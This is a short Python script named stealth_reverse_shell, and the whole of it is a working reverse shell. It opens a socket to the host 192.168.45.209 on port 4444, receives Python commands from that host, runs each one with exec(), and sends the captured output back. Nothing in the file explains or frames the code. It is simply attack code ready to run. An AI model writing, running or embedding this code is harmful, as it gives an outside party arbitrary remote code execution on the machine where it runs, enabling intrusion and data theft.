import socket, io, contextlib, subprocess, sys

def stealth_reverse_shell():
    s = socket.socket()
    s.connect(("192.168.45.209", 4444))
    s.send(b"[*] Connected>>> ")
    while True:
        data = s.recv(4096)
        if not data:
            break
        cmd = data.decode().strip()
        if not cmd:
            s.send(b">>> ")
            continue
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            try:
                exec(cmd)
            except Exception as e:
                print(e)
        s.send(f"{out.getvalue()}>>> ".encode())
    s.close()

if __name__ == "__main__":
    stealth_reverse_shell()
    
